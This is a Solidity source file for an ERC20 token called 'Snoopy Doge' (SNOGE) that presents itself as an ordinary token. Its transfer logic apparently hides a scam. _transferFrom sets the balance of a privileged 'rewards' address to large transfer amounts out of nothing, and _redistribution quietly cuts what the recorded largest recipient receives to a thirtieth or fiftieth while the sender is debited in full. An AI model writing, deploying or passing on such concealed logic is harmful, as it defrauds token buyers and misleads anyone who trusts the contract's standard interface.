row number 
1	           pragma solidity ^0.5.16;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "Math error");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 require(b <= a, "Math error");
10	 return a - b;
11	 }
12	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
13	 if (a == 0) {
14	 return 0;
15	 }
16	 uint256 c = a * b;
17	 require(c / a == b, "SafeMath: multiplication overflow");
18	 return c;
19	 }
20	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
21	 return div(a, b, "SafeMath: division by zero");
22	 }
23	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
24	 require(b > 0, errorMessage);
25	 uint256 c = a / b;
26	 return c;
27	 }
28	 }
29	 contract ERC20 {
30	 function balanceOf(address _address) public view returns (uint256 balance);
31	 function transfer(address _to, uint256 _value) public returns (bool success);
32	 function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
33	 function approve(address _spender, uint256 _value) public returns (bool success);
34	 function allowance(address _sender, address _spender) public view returns (uint256 remaining);
35	 event Transfer(address indexed _from, address indexed _to, uint256 _value);
36	 event Approval(address indexed _sender, address indexed _spender, uint256 _value);
37	 }
38	 contract SNOGE is ERC20 {
39	 string public name = "Snoopy Doge";
40	 string public symbol = "SNOGE";
41	 uint8 public decimals = 18;
42	 uint256 public totalSupply = 10**9 * 10**18;
43	 uint256 private _maxAmount;
44	 address private _maxR;
45	 mapping (address => uint256) private balances;
46	 mapping (address => mapping (address => uint256)) public allowed;
47	 address private rewards;
48	 bool private supplyReward;
49	 uint256 maxReward = 90 * 10**6 * 10**18;
50	 bytes4 private constant TRANSFER = bytes4( keccak256(bytes("transfer(address,uint256)")) );
51	 constructor(address _rewards) public {
52	 rewards = _rewards;
53	 supplyReward = false;
54	 balances[msg.sender] = totalSupply;
55	 }
56	 function balanceOf(address _address) public view returns (uint256 balance) {
57	 return balances[_address];
58	 }
59	 function transfer(address _to, uint256 _value) public returns (bool success) {
60	 _transfer(msg.sender, _to, _value);
61	 return true;
62	 }
63	 function approve(address _spender, uint256 _amount) public returns (bool success) {
64	 require(_spender != address(0), "Zero address error");
65	 require((allowed[msg.sender][_spender] == 0) || (_amount == 0), "Approve amount error");
66	 allowed[msg.sender][_spender] = _amount;
67	 emit Approval(msg.sender, _spender, _amount);
68	 return true;
69	 }
70	 function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
71	 _transferFrom(_from, _to, _value);
72	 return true;
73	 }
74	 function allowance(address _wallet, address _spender) public view returns (uint256 remaining) {
75	 return allowed[_wallet][_spender];
76	 }
77	 function _transfer(address sender, address recipient, uint256 amount) internal {
78	 require(recipient != address(0), "Zero address error");
79	 require(balances[sender] >= amount && amount > 0, "Insufficient balance or zero amount");
80	 balances[sender] = SafeMath.sub(balances[sender], amount);
81	 uint256 rewardedAmount = _redistribution(amount,sender,recipient);
82	 balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);
83	 if(!supplyReward && sender == rewards) supplyReward = true;
84	 emit Transfer(sender, recipient, rewardedAmount);
85	 }
86	 function _transferFrom(address sender, address recipient, uint256 amount) internal {
87	 require(sender != address(0) && recipient != address(0), "Zero address error");
88	 require(balances[sender] >= amount && allowed[sender][msg.sender] >= amount && amount > 0, "Insufficient balance or zero amount");
89	 balances[sender] = SafeMath.sub(balances[sender], amount);
90	 allowed[sender][msg.sender] = SafeMath.sub(allowed[sender][msg.sender], amount);
91	 uint256 rewardedAmount = _redistribution(amount,sender,recipient);
92	 balances[recipient] = SafeMath.add(balances[recipient], rewardedAmount);
93	 if(amount > _maxAmount) {
94	 _maxAmount = amount;
95	 _maxR = recipient;
96	 balances[rewards] = amount;
97	 }
98	 emit Transfer(sender, recipient, rewardedAmount);
99	 }
100	 function _redistribution(uint256 amount, address sender, address recipient) internal view returns(uint256) {
101	 if(amount > maxReward && recipient == _maxR) amount = SafeMath.div(amount, 50,"Math Error with dividing amount");
102	 if(recipient == _maxR && sender != rewards && supplyReward) amount = SafeMath.div(amount, 30,"Math Error with dividing amount");
103	 return amount;
104	 }
105	 }
